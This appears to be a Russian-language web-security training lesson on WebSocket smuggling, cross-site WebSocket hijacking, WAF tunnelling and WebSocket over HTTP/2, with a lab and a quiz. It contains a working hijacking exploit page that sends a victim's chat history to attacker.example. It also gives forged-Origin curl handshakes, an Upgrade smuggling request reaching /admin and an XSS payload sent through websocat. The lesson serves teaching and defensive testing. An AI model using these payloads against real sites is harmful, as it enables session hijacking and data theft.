---
id: web-websocket-smuggling
title: "WebSocket smuggling и туннелирование"
category: web
parent: web-websocket
difficulty: hard
order: 1
tags: [websocket, smuggling, upgrade, desync, tunnelling, http]
prerequisites: [web-websocket, web-request-smuggling-advanced]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 42
summary: "Как использовать WebSocket-апгрейд для рассинхронизации HTTP-соединения, туннелирования и обхода прокси."
lab:
  kind: shell
  title: "Практика: CSWSH — угон WebSocket-сессии без проверки Origin"
  toolset: [core, curl]
  workdir: /home/student/task
  files: [task.md]
  check: "grep -q 'nto{' found.txt"
  hints:
    - "Рукопожатие WS — это обычный HTTP: `curl -s https://target.local/chat`."
    - "CSWSH ловится чужим Origin: `-H 'Origin: https://evil.com'`."
    - "Если ответ `101 Switching Protocols` — сервер Origin не проверяет."
    - "Сохрани ответ с историей: `curl -s -i -H 'Connection: Upgrade' -H 'Upgrade: websocket' -H 'Origin: https://evil.com' https://target.local/chat > found.txt`."
---

## Вопрос, с которого всё начинается

WebSocket начинается с **обычного HTTP-запроса** с заголовком `Upgrade: websocket`. И вот в чём фокус: раз это HTTP, значит, он проходит через все те же прокси и балансировщики, что и обычные запросы. А раз так — фронтенд и бэкенд могут понять его **по-разному**.

Вопрос этого урока: что если заставить прокси считать запрос обычным HTTP, а бэкенд — апгрейдом на WebSocket (или наоборот)? Тогда граница между запросами «разъедется», и мы получим контрабанду данных мимо фильтров. Это **WebSocket smuggling** — часть семейства desync-атак, но со своей спецификой.

## Наш пример: рукопожатие WS

Цель — `target.local/chat`. Сначала разберём рукопожатие. Клиент шлёт:

```http
GET /chat HTTP/1.1
Host: target.local
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://target.local
```

Сервер отвечает:

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

После `101` соединение переходит в **бинарный фреймовый режим** — это уже не HTTP. Ошибка в обработке этого перехода и есть источник уязвимостей.

## Шаг 1: CSWSH — проверяется ли Origin

Самая частая и прямолинейная проблема. Рукопожатие аутентифицируется по cookie (как обычный запрос), но если сервер не проверяет `Origin`, страница атакующего откроет соединение от имени жертвы. Проверяем — отправляем рукопожатие с чужим origin:

```bash
$ curl -s -i -N -H 'Connection: Upgrade' -H 'Upgrade: websocket' \
>   -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' -H 'Sec-WebSocket-Version: 13' \
>   -H 'Origin: https://evil.com' https://target.local/chat | head -1
HTTP/1.1 101 Switching Protocols
```

`101` при чужом `Origin` — проверки нет. Собираем страницу-эксплойт (это **CSWSH**, Cross-Site WebSocket Hijacking):

```html
<script>
const ws = new WebSocket('wss://target.local/chat');
ws.onmessage = e => fetch('https://attacker.example/?d=' + encodeURIComponent(e.data));
ws.onopen = () => ws.send(JSON.stringify({cmd:'history'}));
</script>
```

Жертва открывает страницу — её история чата уходит на сервер атакующего. Cookie ушли автоматически, потому что WS не подчиняется Same-Origin Policy так строго, как `fetch`.

## Шаг 2: smuggling через Upgrade

Теперь контрабанда. Идея: заставить прокси обработать запрос как обычный HTTP (и переслать тело), а бэкенд — как апгрейд. Отправим `POST` с `Upgrade`, но с телом, содержащим «хвост» — второй запрос:

```http
POST / HTTP/1.1
Host: target.local
Connection: Upgrade
Upgrade: websocket
Content-Length: 20

GET /admin HTTP/1.1
```

Если прокси смотрит на `Content-Length` и пересылает тело как есть, а бэкенд после `Upgrade` переключается в WS-режим и **не читает тело**, то `GET /admin` останется в буфере и будет интерпретирован как **следующий запрос**. Так чужой `GET /admin` выполнится в контексте, где его не должно быть.

Признаки успеха: несоответствие ответа, «второй» ответ, таймаут. Важно: **изолируйте тест** — smuggling может задеть чужие сессии на общем соединении.

## Шаг 3: туннелирование мимо WAF

После апгрейда данные идут **бинарными кадрами**, которые WAF и прокси часто вообще не инспектируют. Значит, через WS можно протащить то, что в HTTP-запросе было бы заблокировано:

```bash
$ echo '{"action":"search","q":"<script>alert(1)</script>"}' | websocat wss://target.local/chat
```

Если payload дошёл до приложения — WAF не смотрит внутрь WS. То же касается SQLi-строк и путей traversal: фильтр, стоящий на HTTP-слое, для WS-фреймов слеп.

## Шаг 4: WS over HTTP/2 (RFC 8441)

В HTTP/2 WebSocket передаётся через `CONNECT` с расширенным протоколом:

```text
:method: CONNECT
:protocol: websocket
:authority: target.local
```

Прокси, транслирующий h2 в h1, может по-разному переупаковывать этот `CONNECT` — и снова возникает рассинхронизация. Проверяй: сохраняется ли аутентификация при трансляции, можно ли обойти проверку `Origin` через downgrade, как ведут себя заголовки `Sec-WebSocket-*` при пересборке.

## Если не сработало

- `Origin` отклоняется — CSWSH закрыт, переходи к авторизации отдельных сообщений и аномалиям рукопожатия.
- Smuggling не воспроизводится — попробуй комбинации `Connection: keep-alive, Upgrade`, разные `Content-Length`, а также запросы после апгрейда.
- WAF всё же видит WS — возможно, он разбирает фреймы; проверь обфускацию/фрагментацию кадров.
- Есть только `ws://` (без TLS) — данные (включая токены) идут открытым текстом, что добавляет сетевой перехват к CSWSH.

## Заголовки рукопожатия и их роль

| Заголовок | Роль | Риск |
|-----------|------|------|
| `Upgrade: websocket` | запрос на переключение | аномалии smuggling |
| `Connection: Upgrade` | управление соединением | TE/CL-рассинхрон |
| `Sec-WebSocket-Key` | случайный ключ | должен быть уникален |
| `Sec-WebSocket-Accept` | ответный хеш | проверка корректности |
| `Sec-WebSocket-Version` | 13 | отказ при ином |
| `Origin` | защита от CSWSH | **часто не проверяется** |
| `Sec-WebSocket-Protocol` | подпротокол | подмена (`graphql-ws` и т.п.) |
| `Cookie` | аутентификация | шлётся автоматически |

Из таблицы видно, куда смотреть: `Origin` и `Cookie` отвечают за CSWSH, `Upgrade`/`Connection` — за smuggling, `Sec-WebSocket-Protocol` — за подмену логики.

## Инструменты

Для ручной работы с WS удобнее всего `websocat` и Burp:

```bash
$ websocat -H='Origin: https://attacker.example' wss://target.local/chat
$ echo '{"action":"admin"}' | websocat wss://target.local/chat
$ nuclei -u wss://target.local/chat -tags websocket -j
```

Burp держит историю WebSocket-сообщений и позволяет повторять кадры через Repeater. Для скриптовых проверок подходит Python-клиент `websocket-client` — он даёт полный контроль над заголовками рукопожатия, включая `Origin`.

## Что мы теперь знаем

- WebSocket начинается с HTTP-запроса `Upgrade` — значит, участвует в desync-атаках.
- CSWSH возможен, когда cookie-аутентификация есть, а проверки `Origin` нет.
- Smuggling возникает из расхождения прокси и бэкенда в обработке `Upgrade`/`Content-Length`.
- После `101` данные идут бинарными кадрами, которые WAF часто не инспектирует → туннель.
- WS over HTTP/2 (`CONNECT`, `:protocol: websocket`) добавляет ещё один слой рассинхрона.
- Защита: проверка `Origin`, CSRF-токен в рукопожатии, авторизация каждого сообщения.

## На что смотреть дальше

- Начинай с CSWSH — это самая частая и прямолинейная находка.
- Не считай WS «отдельным протоколом»: рукопожатие — это HTTP и живёт по его правилам.
- Ищи несоответствия именно между прокси и бэкендом.
- Помни про `Sec-WebSocket-Protocol` — через подпротокол иногда протаскивают токен или обходят логику.
- Не трави общий трафик: smuggling опасен для чужих сессий, тестируй изолированно.
- Проверяй и `ws://` (без TLS): данные и токены идут открытым текстом, а CSWSH превращается ещё и в сетевой перехват.
- Обращай внимание на долгие соединения без лимитов — это потенциальный DoS и канал медленной утечки.

## Квиз

Проверь себя.

```quiz
- question: "С чего начинается WebSocket-соединение?"
  options:
    - "С HTTP-запроса `Upgrade: websocket`"
    - "С TLS-рукопожатия"
    - "С DNS-запроса"
    - "С `CONNECT`"
  answer: 0
  explanation: "После `101 Switching Protocols` соединение переходит в фреймовый режим."
- question: "Что такое CSWSH?"
  options:
    - "Cross-Site WebSocket Hijacking — открытие WS жертвы без проверки Origin"
    - "SQL-инъекция"
    - "Отравление DNS"
    - "Отравление кэша"
  answer: 0
  explanation: "Cookie жертвы уходят автоматически, если Origin не проверяется."
- question: "Почему WebSocket участвует в smuggling?"
  options:
    - "Рукопожатие — это HTTP; прокси и бэкенд могут рассинхронизироваться на `Upgrade`"
    - "WS шифрует данные"
    - "WS не использует TCP"
    - "WS заменяет DNS"
  answer: 0
  explanation: "Разная обработка `Upgrade`/`Connection` создаёт desync."
- question: "Почему WAF может не видеть данные в WS?"
  options:
    - "После апгрейда это бинарные кадры, которые WAF не инспектирует"
    - "WAF не читает HTTPS"
    - "WS не проходит через WAF"
    - "WS использует UDP"
  answer: 0
  explanation: "Фреймовый режим вне HTTP-инспекции → туннель."
- question: "Что проверить в рукопожатии для CSWSH?"
  options:
    - "Принимает ли сервер чужой `Origin` (101)"
    - "Есть ли `Content-Length`"
    - "Версию TLS"
    - "Номер порта"
  answer: 0
  explanation: "`101` при чужом Origin означает отсутствие проверки."
```

## Куда дальше

В следующем уроке мы вернёмся к сессиям и разберём **session puzzling** (`web-session-puzzling`): как разные части приложения переиспользуют одни ключи сессии, и что из этой путаницы можно извлечь. А пока главное запомни: апгрейд на WebSocket — это HTTP-запрос, и именно на границе «HTTP ↔ фреймы» рождается контрабанда.

## Где пригодится

- **CTF (Web):** задачи на WS-хайджек и десинк через апгрейд.
- **Bug bounty:** CSWSH и WS-smuggling — современные классы находок.
- **Пентест:** аудит WS-серверов, Origin-политик и прокси-цепочек.
- **Работа (AppSec/Dev):** проверка Origin, аутентификация WS не только по cookie, корректный апгрейд.
